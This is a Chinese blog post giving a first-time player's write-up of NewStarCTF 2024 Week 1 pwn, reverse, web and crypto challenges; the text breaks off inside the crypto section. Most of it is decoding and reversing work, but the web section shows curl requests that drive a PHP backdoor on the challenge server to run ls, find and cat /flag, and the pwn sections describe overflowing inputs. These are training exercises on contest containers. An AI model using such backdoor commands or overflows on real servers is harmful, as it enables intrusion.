<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  

  
  <title>NewStarCTF 2024 WriteUp | 棱晶の小窝</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="注：这是我第一次参加CTF，初来乍到，当时的许多表达、做法放在现在看都是不专业甚至可笑的，就当做黑历史吧… 赛题轮次：Week1已解出的题目：    题目类型 题目名称    Pwn Real Login、Game、overwrite、gdb   Reverse base64、ezAndroidStudy、Simple_encryption、ez_debug、begin   Web headach">
<meta property="og:type" content="article">
<meta property="og:title" content="NewStarCTF 2024 WriteUp">
<meta property="og:url" content="http://example.com/2024/11/04/ns24_week1/index.html">
<meta property="og:site_name" content="棱晶の小窝">
<meta property="og:description" content="注：这是我第一次参加CTF，初来乍到，当时的许多表达、做法放在现在看都是不专业甚至可笑的，就当做黑历史吧… 赛题轮次：Week1已解出的题目：    题目类型 题目名称    Pwn Real Login、Game、overwrite、gdb   Reverse base64、ezAndroidStudy、Simple_encryption、ez_debug、begin   Web headach">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-11-03T16:00:00.000Z">
<meta property="article:modified_time" content="2025-03-13T04:54:33.725Z">
<meta property="article:author" content="Astral Prisma">
<meta name="twitter:card" content="summary">
  
  
    <link rel="shortcut icon" href="/XH.png">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/OTSA.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>棱晶の小窝 </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/AP.png></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Astral Prisma </div>
      <div class="dot"></div>
      <div class="subtitle">星界棱晶 </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/454936579" title="Bilibili"><image src=https://www.bilibili.com/favicon.ico></image></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://www.primegrid.com/show_user.php?userid=1243718" title="PrimeGrid"><image src=https://www.primegrid.com/images/favicon_32.png></image></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/AstralPrisma" title="GitHub"><image src=https://github.githubassets.com/favicons/favicon.png></image></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      



    
      

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       


<article id="post-ns24_week1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        NewStarCTF 2024 WriteUp
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2024-11-03T16:00:00.000Z" itemprop="datePublished">2024-11-04</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
    Uncategorized 
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            12k words 
          </div>
        </div>
        
      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <p><em>注：这是我第一次参加CTF，初来乍到，当时的许多表达、做法放在现在看都是不专业甚至可笑的，就当做黑历史吧…</em></p>
<h1 id="赛题轮次：Week1"><a href="#赛题轮次：Week1" class="headerlink" title="赛题轮次：Week1"></a>赛题轮次：Week1</h1><p>已解出的题目：</p>
<table>
<thead>
<tr>
<th align="center">题目类型</th>
<th align="center">题目名称</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Pwn</td>
<td align="center">Real Login、Game、overwrite、gdb</td>
</tr>
<tr>
<td align="center">Reverse</td>
<td align="center">base64、ezAndroidStudy、Simple_encryption、ez_debug、begin</td>
</tr>
<tr>
<td align="center">Web</td>
<td align="center">headach3、会赢吗、智械危机</td>
</tr>
<tr>
<td align="center">Crypto</td>
<td align="center">xor、Base、一眼秒了、Strange King</td>
</tr>
<tr>
<td align="center">Misc</td>
<td align="center">WhereIsFlag、Labyrinth、decompress、pleasingMusic、兑换码</td>
</tr>
</tbody></table>
<h2 id="Pwn方向："><a href="#Pwn方向：" class="headerlink" title="Pwn方向："></a>Pwn方向：</h2><h3 id="Real-Login："><a href="#Real-Login：" class="headerlink" title="Real Login："></a>Real Login：</h3><p>反编译观察函数，发现要输入密码，找到密码是<font color=red><strong>NewStar!!!</strong></font>，观察发现没有位数溢出保护机制，在虚拟机中nc地址后输入NewStar!!!+大量额外字符弹出祝贺，此时已经成功，用ls指令查看文件发现有一个flag，再用cat查看得到<font color=deepskyblue><strong>flag{6a532e27-a281-4c15-b965-c030de9c47df}</strong></font>.</p>
<h3 id="Game："><a href="#Game：" class="headerlink" title="Game："></a>Game：</h3><p>反编译观察函数，发现是要求在5s内输入0-9之间的数，总和超出999之后可以获得控制权限，于是在nc地址之后以形如“9 换行 9 换行 9…”的形式同时输入一百余次复制粘贴执行，获得控制权，用ls查看发现有flag，再查看发现<font color=deepskyblue><strong>flag{4a045fea-9b70-4637-8561-cf5bece7e814}</strong></font>.</p>
<h3 id="Overwrite："><a href="#Overwrite：" class="headerlink" title="Overwrite："></a>Overwrite：</h3><p>反编译观察函数，第一个要求填入读取的字节数，不能超过48字节（但为什么容器里超过40就不行了？），第二个要求填数，填入的数被存在nbytes里，但接下来程序却会用nptr和114514进行比较，结合题目名称猜测应该是要输入超长的字节来覆盖同栈上的nptr，于是将第一个空填入超大的数，发现第二空能正常填入，经过动态调试发现输入54个9时nptr会被覆盖为999999\n，大于等于114514，所以在第一空输入一大堆9，第二空输入54个9，返回<font color=deepskyblue><strong>flag{48d03781-f157-4869-8041-5ba44bef070a}</strong></font>.</p>
<h3 id="gdb："><a href="#gdb：" class="headerlink" title="gdb："></a>gdb：</h3><p>反编译观察函数，注意到是把字符串<font color=red><strong>0d000721</strong></font>以key &#x3D; <font color=red><strong>mysecretkey1234567890abcdefghijk</strong></font>用AVX指令集进行了复杂的加密，再与输入的值进行比对，观察加密函数，经过IDA+linux远程动态调试和把原函数丢给AI验证出需要输入的字符对应的十六进制是<font color=aqua><strong>5D 1D 43 55 53 45 57 45</strong></font>，对应的字符是]_x001D_CUSEWE（第二个字符是不可打印字符），尝试把不可打印字符输入进命令行中，发现进入程序并不能正常转换，于是使用命令来代替输入：<font color=red><strong>printf ‘\x5D\x1D\x43\x55\x53\x45\x57\x45’ | nc 容器地址</strong></font>，返回祝贺和<font color=deepskyblue><strong>flag{205f9ae3-9d66-4523-b4b7-283cb5e1e381}</strong></font>.</p>
<h2 id="Reverse方向："><a href="#Reverse方向：" class="headerlink" title="Reverse方向："></a>Reverse方向：</h2><h3 id="Base64："><a href="#Base64：" class="headerlink" title="Base64："></a>Base64：</h3><p>用IDA打开base64.exe然后在string里面发现以下几行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0000000140011003	00000011	C	Enter the flag: </span><br><span class="line">.rdata:0000000140011014	00000018	C	Wrong flag, try again.\n</span><br><span class="line">.rdata:0000000140011030	00000025	C	g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc=</span><br><span class="line">.rdata:0000000140011055	0000000F	C	Correct flag!\n</span><br><span class="line">.rdata:0000000140011064	00000014	C	Welcome to NewStar!</span><br><span class="line">.rdata:0000000140011080	00000041	C	WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ/</span><br></pre></td></tr></table></figure>
<p>由最后一行和题目名称猜测该行为换了表的base64加密，g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc&#x3D;应该是用换表base64加密的flag，由此构建Python代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc=&quot;</span></span><br><span class="line">base64\_1 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">base64\_2 = <span class="string">&quot;WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ/&quot;</span></span><br><span class="line">t = str1.translate(<span class="built_in">str</span>.maketrans(base64\_2,base64\_1))</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(t).decode())</span><br></pre></td></tr></table></figure>
<p>解得flag为<font color=deepskyblue><strong>flag{y0u_kn0w_base64_well}</strong></font>.</p>
<h3 id="ezAndroidStudy："><a href="#ezAndroidStudy：" class="headerlink" title="ezAndroidStudy："></a>ezAndroidStudy：</h3><p>在模拟器上安装并运行apk，进入后提示用jadx进行反编译，并提示第一段flag在Androidmanifest.xml的activity里，反编译后在资源文件里找到Androidmanifest.xml，发现有两个activity，其中一个<br><code>&lt;activity android:name=&quot;work.pangbai.ezandroidstudy.Homo&quot;/&gt;</code>点开后发现第一部分的flag：<font color=deepskyblue><strong>flag{Y0u</strong></font>，进入二部分，得知flag在<code>resources.arsc/res/value/string.xml</code>中，寻找得到第二部分的flag：<font color=deepskyblue><strong>_@r4</strong></font>，进入第三部分，根据提示在<code>/res/layout/activity\_main.xml</code>中找到第三部分的flag：<font color=deepskyblue><strong>_900d</strong></font>，进入第四部分，根据提示在<code>/res/raw/</code>找到<code>flag4.txt</code>，获得第四部分的flag：<font color=deepskyblue><strong>_andr01d</strong></font>，进入第五部分，根据其提示在<code>/lib/x86\_64/</code>中找到<code>libezandroidstudy.so</code>和<code>/libpl\_droidsonroids\_gif.so</code>，导出后在IDA查看<code>libezandroidstudy.so</code>，在函数中找到<code>Java\_work\_pangbai\_ezandroidstudy\_MainActivity\_getflag5</code>，反编译发现第五部分的flag：<font color=deepskyblue><strong>_r4V4rs4r}</strong></font>，拼合得到<font color=deepskyblue><strong>flag{Y0u_@r4_900d_andr01d_r4V4rs4r}</strong></font>.</p>
<h3 id="Simple-encryption："><a href="#Simple-encryption：" class="headerlink" title="Simple_encryption："></a>Simple_encryption：</h3><p>在IDA中反编译并观察代码，首先要求输入的flag会逐个字符填入input数组中，直到达到30个字符，之后对于其中每个字符，根据其在数组中的位置分别进行不同的转换：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; len; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !(j % <span class="number">3</span>) )<span class="comment">//3的倍数</span></span><br><span class="line">    input[j] -= <span class="number">31</span>;<span class="comment">//让该字符的ASCII值减31</span></span><br><span class="line">  <span class="keyword">if</span> ( j % <span class="number">3</span> == <span class="number">1</span> )<span class="comment">//余1</span></span><br><span class="line">    input[j] += <span class="number">41</span>;<span class="comment">//让该字符的ASCII值加41</span></span><br><span class="line">  <span class="keyword">if</span> ( j % <span class="number">3</span> == <span class="number">2</span> )<span class="comment">//余2</span></span><br><span class="line">    input[j] ^= <span class="number">0x55u</span>;<span class="comment">//对该字符的ASCII值进行0x55的异或</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来是将字符ASCII转为十六进制并与buffer中的值进行比较：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; len; ++k )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0x%02x &quot;</span>, input[k]);</span><br><span class="line">  <span class="keyword">if</span> ( input[k] != buffer[k] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中buffer为<font color=lime>{0x47, 0x95, 0x34, 0x48, 0xA4, 0x1C, 0x35, 0x88, 0x64, 0x16, 0x88,0x07, 0x14, 0x6A, 0x39, 0x12, 0xA2, 0x0A, 0x37, 0x5C, 0x07, 0x5A,0x56, 0x60, 0x12, 0x76, 0x25, 0x12, 0x8E, 0x28, 0x00, 0x00}</font>，倒推得到<font color=LimeGreen>{102, 108, 97, 103, 123, 73, 84, 95, 49, 53, 95, 82, 51, 65, 108, 49, 121, 95, 86, 51, 82, 121, 45, 53, 49, 77, 112, 49, 101, 125, 31, -41}</font>（末尾两个数据排除），结合ASCII得知flag为：<font color=deepskyblue><strong>flag{IT_15_R3Al1y_V3Ry-51Mp1e}</strong></font>，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x47</span>, <span class="number">0x95</span>, <span class="number">0x34</span>, <span class="number">0x48</span>, <span class="number">0xA4</span>, <span class="number">0x1C</span>, <span class="number">0x35</span>, <span class="number">0x88</span>, <span class="number">0x64</span>, <span class="number">0x16</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0x14</span>, <span class="number">0x6A</span>, <span class="number">0x39</span>, <span class="number">0x12</span>, <span class="number">0xA2</span>, <span class="number">0x0A</span>, <span class="number">0x37</span>, <span class="number">0x5C</span>, <span class="number">0x07</span>, <span class="number">0x5A</span>,<span class="number">0x56</span>, <span class="number">0x60</span>, <span class="number">0x12</span>, <span class="number">0x76</span>, <span class="number">0x25</span>, <span class="number">0x12</span>, <span class="number">0x8E</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">if</span>(i % <span class="number">3</span> == <span class="number">0</span>):</span><br><span class="line">        a[i] += <span class="number">31</span></span><br><span class="line">    <span class="keyword">elif</span>(i % <span class="number">3</span> == <span class="number">1</span>):</span><br><span class="line">        a[i] -= <span class="number">41</span></span><br><span class="line">    <span class="keyword">elif</span>(i % <span class="number">3</span> == <span class="number">2</span>):</span><br><span class="line">        a[i] = a[i] ^ <span class="number">0x55</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]),end = <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="ez-debug："><a href="#ez-debug：" class="headerlink" title="ez_debug："></a>ez_debug：</h3><p>将程序用x64dbg打开，将断点打在输出Decrypted flag:所对应的行，进行动态调试，输入随便的字符，到断点位置时发现断点的周围变量中含有flag：<font color=deepskyblue><strong>flag{y0u_ar3_g0od_@_Debu9}</strong></font>.</p>
<h3 id="Begin："><a href="#Begin：" class="headerlink" title="Begin："></a>Begin：</h3><p>运行exe程序，发现需要用IDA进行反编译，打开IDA进行反编译，按<code>Fn+F5</code>反编译main函数得到第八行为：<br><code>strcpy((char *)&amp;flag_part1, &quot;OK,You can click on this variable to discover the first part\n&quot;);</code><br>点击其中的变量得到乱码：6B614D7B67616C66h，按a转化为字符串得到flag的第一部分：flag{Mak3_aN_（这里在看十六进制的时候也找到了对应行：<br><code>0000000000403010  66 6C 61 67 7B 4D 61 6B  33 5F 61 4E 5F 00 00 00</code><br><font color=deepskyblue><strong>flag{Mak3_aN_</strong></font>…），再按<code>Fn+Shift+F12</code>转到<br><code>.rdata:0000000000404000	00000086	C	this is flag part2: 3Ff0rt\_tO\_5eArcH\_  ,You can press&#39; x &#39;on the variable name of this string to view the function that references it</code>，得到第二部分的flag：<font color=deepskyblue><strong>3Ff0rt_tO_5eArcH_</strong></font>，注意到其下方两行还有提示：<br><code>.rdata:0000000000404088	0000007A	C	And you can press &#39;x&#39; key on the function name to see which function references this function,Flag Part 3 is right there.</code>和<br><code>.rdata:0000000000404108	00000045	C	the function name is flag part3,Don&#39;t forget to add a &#39;&#125;&#39; at the end</code>，按提示双击左侧<code>.rdata:0000000000404108</code>跳转到IDA_view，找到第三部分的flag函数为：<font color=deepskyblue><strong>F0r_th3_f14g_C0Rpse</strong></font>，组合得到<font color=deepskyblue><strong>flag{Mak3_aN_3Ff0rt_tO_5eArcH_F0r_th3_f14g_C0Rpse}</strong></font>.</p>
<h2 id="Web方向："><a href="#Web方向：" class="headerlink" title="Web方向："></a>Web方向：</h2><h3 id="Headach3："><a href="#Headach3：" class="headerlink" title="Headach3："></a>Headach3：</h3><p>打开网页后发现是head(er) ache，header是标头，开启开发者模式，在网络页面刷新网页，得到一个文档，在响应标头里找到属性fl3g:<font color=deepskyblue><strong>flag{You_Ar3_R3Ally_A_9ooD_d0ctor}</strong></font>.</p>
<h3 id="会赢吗："><a href="#会赢吗：" class="headerlink" title="会赢吗："></a>会赢吗：</h3><p>第一个页面在源代码中发现flag第一部分<font color=deepskyblue><strong>ZmxhZ3tXQTB3</strong></font>以及第二个页面的后缀<font color=red><strong>&#x2F;4cqu1siti0n</strong></font>，第二个页面发现给出了一个getflag的方法，于是结合上面给出的课程名称，在控制台调用并输出第二部分的 flag: <font color=deepskyblue><strong>IV95NF9yM2Fs</strong></font>和第三个页面的后缀<font color=red><strong>&#x2F;s34l</strong></font>，第三个页面检查源代码后发现要把已封印的文本改成解封，发现flag的第三个部分<font color=deepskyblue><strong>MXlfR3I0c1B</strong></font>和第四个页面的后缀<font color=red><strong>&#x2F;Ap3x</strong></font>，进入第四个页面，发现有一个被禁用的noscript按钮无量空处，挪出来后发现不显示，于是在前面将class为s的改为显示，按下得到flag的第四部分<font color=deepskyblue><strong>fSkpKcyF9</strong></font>，合并起来之后得到<font color=deepskyblue><strong>ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9</strong></font>，进行base64后解密得到<font color=deepskyblue><strong>flag{WA0w!_y4_r3al1y_Gr4sP_JJJs!}</strong></font>.</p>
<h3 id="智械危机："><a href="#智械危机：" class="headerlink" title="智械危机："></a>智械危机：</h3><p>询问ai后在网页后加入后缀<font color=red><strong>&#x2F;robots.txt</strong></font>，访问得到两行数据：<code>User-agent: \*</code>和<code>Disallow: /backd0or.php</code>，查询百科得知<code>robots.txt</code>的作用，并访问后缀<code>/backd0or.php</code>，访问后查询得知这是一种后门示例，需要提供cmd和key，观察代码得知key会被base64解码为decoded_key，cmd会被先翻转字母再取MD5，然后判定两者是否相等，如果不等则以不合法的密钥来结束，否则将cmd也base64解码，执行被解码的cmd，若访问后门时候提供了cmd和key就会执行decrypt_request后再带进execute_cmd执行得到系统返回的cmd，否则就展示后门的源代码.<br>首先尝试列出所有文件（ls指令），尝试Linux输入命令：<br><code>curl -X POST -d &quot;cmd=bHM=&amp;key=N2FiZThiMjRiZDAxMzc0NDZmZDMzNmMyMjk4ZmNjYTA=&quot; http://eci-2zeimkpaddax8w71qsw9.cloudeci1.ichunqiu.com/backd0or.php </code>，只返回了backd0or.php、index.php、robots.txt，并没有所需的flag，于是进一步搜寻所有带flag的文件（<code>find / -name &quot;flag\*&quot; 2&gt;/dev/null</code>）：<code>curl -X POST -d &quot;cmd=ZmluZCAvIC1uYW1lICJmbGFnKiIgMj4vZGV2L251bGw=&amp;key=Y2ZlNDg1MjNjNTY4NmI5YzBjNmIwM2M3YmQyN2JiMjg=&quot; http://eci-2zeimkpaddax8w71qsw9.cloudeci1.ichunqiu.com/backd0or.php</code>，返回了如下文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/sys/devices/pnp0/00:04/tty/ttyS0/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS2/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS3/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS1/flags</span><br><span class="line">/sys/devices/pci0000:00/0000:00:03.0/virtio0/net/eth0/flags</span><br><span class="line">/sys/devices/virtual/net/lo/flags</span><br><span class="line">/sys/devices/virtual/net/dummy0/flags</span><br><span class="line">/flag</span><br></pre></td></tr></table></figure>
<p>再查看flag：<code>curl -X POST -d &quot;cmd=Y2F0IC9mbGFn&amp;key=ODc5YTU5MWM2Nzg1YTRlMTM5OGI5NmE5YTFiYzY3ZWI=&quot; http://eci-2zeimkpaddax8w71qsw9.cloudeci1.ichunqiu.com/backd0or.php</code>，得到<font color=deepskyblue><strong>flag{03b6f3f8-8dfa-40e3-b077-59d9009d520e}</strong></font>.</p>
<h2 id="Crypto方向："><a href="#Crypto方向：" class="headerlink" title="Crypto方向："></a>Crypto方向：</h2><h3 id="Xor："><a href="#Xor：" class="headerlink" title="Xor："></a>Xor：</h3><p>题目给了一个xor的python程序，将两个量执行后得到了c1的long整数和c2的byte字符串，并给出了<code>key = b&#39;New\_Star\_CTF&#39;</code>，现将<code>c2=b&#39;;:\x1c1&lt;\x03&gt;\*\x10\x11u;&#39;</code>转换为long整数<code>18329866411473355926313989435</code>，用题目所给库<code>pycryptodome</code>进行逆向还原，把key也从byte字符串转换为long整数，并分别用c1和c2与key进行异或运算，将得到的long整数再次转换为byte字符串，并用utf-8编码得到前半段<font color=deepskyblue><strong>flag{0ops!_yo</strong></font>和后半段<font color=deepskyblue><strong>u_know_XOR!}</strong></font>，最终<font color=deepskyblue><strong>flag{0ops!_you_know_XOR!}</strong></font>.<br>Python代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;New_Star_CTF&#x27;</span></span><br><span class="line">key2 = bytes_to_long(key)</span><br><span class="line">c1 = <span class="number">8091799978721254458294926060841</span></span><br><span class="line">c2 = <span class="string">b&#x27;;:\x1c1&lt;\x03&gt;*\x10\x11u;&#x27;</span></span><br><span class="line">c2 = bytes_to_long(c2) <span 